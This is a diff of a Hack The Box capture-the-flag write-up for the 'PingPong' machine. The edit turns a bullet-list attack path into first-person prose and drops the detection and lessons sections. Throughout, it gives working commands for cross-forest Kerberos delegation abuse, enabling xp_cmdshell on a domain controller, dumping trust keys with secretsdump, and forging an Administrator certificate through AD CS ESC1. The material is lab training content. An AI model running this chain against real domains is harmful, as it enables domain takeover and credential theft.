@@ -9,50 +9,14 @@ avatar: assets/htb/pingpong.png
 tags: [active-directory, cross-forest-trust, kerberos-only, mssql-delegation, adcs, aes256, no-ntlm]
 htb_url: https://app.hackthebox.com/machines/PingPong
 ---
+
 ## Summary
 
-PingPong is an assume-breach, two-forest Active Directory engagement.
+PingPong is an Insane Windows machine built as an assume-breach, two-forest Active Directory engagement. The external entry point is `PING.HTB` (DC1: `dc1.ping.htb`), which has a bidirectional trust with the internal-only `PONG.HTB` (DC2: `dc2.pong.htb`, reachable only through DC1). Both domains have NTLM disabled, forcing Kerberos-only authentication, and `PONG.HTB` additionally disables RC4 so AES256 keys are mandatory. Significant host clock skew from real UTC means every Kerberos operation needs a `faketime` / `ntpdate` workaround. Starting from a low-privilege foothold in `ping.htb`, I leverage Kerberos and MSSQL constrained delegation to compromise `dc2.pong.htb`, extract cross-realm credential material, and return to `ping.htb` to abuse AD CS, obtaining a certificate that maps to `Administrator@ping.htb`.
 
-- **PING.HTB** -> DC1: `dc1.ping.htb` (external entry point)
-- **PONG.HTB** -> DC2: `dc2.pong.htb` (internal-only, reachable via DC1)
-- **Bidirectional trust** between the forests
-- **NTLM is disabled on both domains** (Kerberos-only authentication)
-- **RC4 is disabled on PONG.HTB** (AES256 keys mandatory)
-- **Significant host clock skew** from real UTC, requiring `faketime` / `ntpdate` workarounds on every Kerberos operation
+## Enumeration
 
-Starting from a low-privilege foothold in `ping.htb`, the path leverages Kerberos and MSSQL delegation to compromise `dc2.pong.htb`, extracts cross-realm credential material, and returns to `ping.htb` to abuse **AD CS**, obtaining a certificate that maps to `Administrator@ping.htb`.
-
----
-
-## External Writeups
-
-- [HackIndex - PingPong](https://hackindex.io/writeups/pingpong)
-- [Axura (Protected)](https://4xura.com/writeups-for-ctfs/htb/htb-writeup-pingpong/)
-- [Ibrahim Isiaq Bolaji](https://www.ibrahimisiaqbolaji.com/2026/04/pingpong-htb-write-up.html)
-- [Toshith's Blog](https://blog.toshith.in/story/NjY)
-- [vapt.services - Red Team Simulation](https://vapt.services/pingpong-htb-machine-a-realistic-red-team-simulation-in-disguise/)
-- [CyberSecGuru: Mastering PingPong](https://thecybersecguru.com/ctf-walkthroughs/beginners-guide-to-conquering-pingpong-on-hackthebox/)
-- [1337 Sheets - PingPong Insane (Apr 25, 2026)](https://1337sheets.com/hack-the-box-season-10-htb-pingpong-writeup-insane-weekly-april-25th-2026/)
-- [Buy Me a Coffee - Step-by-step Explanation](https://buymeacoffee.com/thecybersecguru/pingpong-htb-step-step-writeup-explanation)
-
----
-
-## Key Techniques
-
-- Cross-forest trust enumeration (`Get-ADTrust`, `nltest /domain_trusts`)
-- Kerberos-only authentication (no NTLM fallback)
-- AES256 Kerberos keys (RC4 disabled) - `ticketer.py` / `getTGT` flags
-- Clock skew workaround (`ntpdate`, `faketime`) for every Kerberos call
-- MSSQL constrained delegation across forest trust
-- S4U2Self + S4U2Proxy with cross-realm referrals
-- AD CS ESC1/ESC8 template abuse for `Administrator@ping.htb` certificate mapping
-- PKINIT authentication with forged certificate
-
----
-
-## Attack Path
-
-### 1. Time Sync
+Because the whole chain runs on Kerberos, the first thing I do is sync my clock to the domain controller. The skew is large enough that tickets are rejected outright without it, so I either set time globally or wrap individual commands in `faketime`:
 
 ```bash
 sudo ntpdate -u dc1.ping.htb
@@ -60,7 +24,7 @@ sudo ntpdate -u dc1.ping.htb
 faketime "$(rdate -p dc1.ping.htb)" impacket-getTGT ...
 ```
 
-### 2. Enumerate Cross-Forest Trust
+With time handled, I enumerate the forest trust. RPC dumping DC1 and running BloodHound against `ping.htb` confirms the bidirectional trust to `pong.htb`, and I resolve the internal DC2 host through DC1's DNS:
 
 ```bash
 impacket-rpcdump -no-pass @dc1.ping.htb
@@ -69,9 +33,16 @@ bloodhound-python -u <user> -p <pw> -d ping.htb -dc dc1.ping.htb -c All
 nslookup dc2.pong.htb dc1.ping.htb
 ```
 
-### 3. MSSQL Delegation Pivot to PONG.HTB
+Enumerating certificate templates on `ping.htb` with Certipy reveals a vulnerable ESC1/ESC8 template that becomes the privilege escalation path later:
 
-A service account in `ping.htb` has constrained delegation to an MSSQL SPN on `dc2.pong.htb`:
+```bash
+certipy find -u <user>@ping.htb -hashes :<NT> -dc-ip dc1.ping.htb -vulnerable
+# Identify ESC1 / ESC8 template
+```
+
+## Foothold
+
+A service account in `ping.htb` has constrained delegation to an MSSQL SPN on `dc2.pong.htb`. Since NTLM is disabled, every Impacket call must use `-k` and AES256 key material. I request a TGT for the service account, then chain S4U2Self + S4U2Proxy across the trust to impersonate `Administrator`:
 
 ```bash
 impacket-getTGT ping.htb/svc_sql:'<pw>' -aesKey <aes256>
@@ -81,7 +52,7 @@ impacket-getST -spn 'MSSQLSvc/dc2.pong.htb:1433' \
   ping.htb/svc_sql -k -no-pass -aesKey <aes256>
 ```
 
-The cross-realm referral chain produces a ST for `Administrator@PONG.HTB` via the trust. Use it:
+The cross-realm referral chain produces a service ticket for `Administrator@PONG.HTB` via the trust. I use it to connect to MSSQL on DC2 and enable `xp_cmdshell` for command execution:
 
 ```bash
 impacket-mssqlclient -k dc2.pong.htb -no-pass
@@ -90,27 +61,18 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';  -- nt authority\system on DC2 if delegation chains correctly
 ```
 
-### 4. Extract Cross-Realm Trust Key
+When the delegation chains correctly this lands as `nt authority\system` on DC2.
 
-From `dc2.pong.htb` SYSTEM:
+## Privilege Escalation
+
+From SYSTEM on `dc2.pong.htb`, I dump secrets to pull the inter-realm trust keys between `PONG.HTB` and `PING.HTB`. These keys let me forge cross-realm referral TGTs back into `ping.htb`:
 
 ```bash
 impacket-secretsdump -k -no-pass dc2.pong.htb
 # inter-realm trust keys: PONG.HTB <-> PING.HTB
 ```
 
-The trust key allows forging cross-realm referral TGTs back into `ping.htb`.
-
-### 5. AD CS to Administrator@ping.htb
-
-Enumerate certificate templates on `ping.htb`:
-
-```bash
-certipy find -u <user>@ping.htb -hashes :<NT> -dc-ip dc1.ping.htb -vulnerable
-# Identify ESC1 / ESC8 template
-```
-
-ESC1 path: request a cert specifying `userPrincipalName = Administrator@ping.htb`:
+Back in `ping.htb`, I abuse the vulnerable AD CS template identified during enumeration. The ESC1 path lets me request a certificate while specifying a `userPrincipalName` of `Administrator@ping.htb`:
 
 ```bash
 certipy req -u svc_sql@ping.htb -hashes :<NT> \
@@ -118,28 +80,9 @@ certipy req -u svc_sql@ping.htb -hashes :<NT> \
   -upn Administrator@ping.htb -dc-ip dc1.ping.htb
 ```
 
-PKINIT authentication with the forged cert yields `Administrator@PING.HTB`:
+PKINIT authentication with the forged certificate yields the NT hash for `Administrator@PING.HTB`, which I can then use with PsExec or WMIExec to take full control of the forest:
 
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip dc1.ping.htb
 # NT hash recovered, PSExec / WMIExec as Administrator
 ```
-
----
-
-## Lessons Learned
-
-- **No-NTLM AD is the future.** Tooling that assumes NTLM fallback (most Impacket commands without `-k`) will silently fail. Always pass `-k -no-pass -aesKey`.
-- **Cross-forest constrained delegation** is undertaught and frequently misconfigured. Trust + delegation is the modern "golden ticket without the golden ticket".
-- **AD CS ESC1/ESC8** survives despite years of warnings; the forged-UPN trick remains effective when `EDITF_ATTRIBUTESUBJECTALTNAME2` or "Supply in request" templates exist.
-- **Clock skew** is the #1 silent killer of Kerberos attack chains. `ntpdate` or `faketime` before every `getST`.
-- Multi-forest assume-breach is the closest HTB has come to a real red-team scenario.
-
----
-
-## Detection
-
-- LDAP `msDS-AllowedToDelegateTo` modifications.
-- Kerberos referral TGT requests with `msDS-CrossDomainAccountInfo` set.
-- AD CS event 4886 (certificate request) with a UPN/SAN mismatching the requester's account.
-- `xp_cmdshell` enable + execute on a DC (highly anomalous).
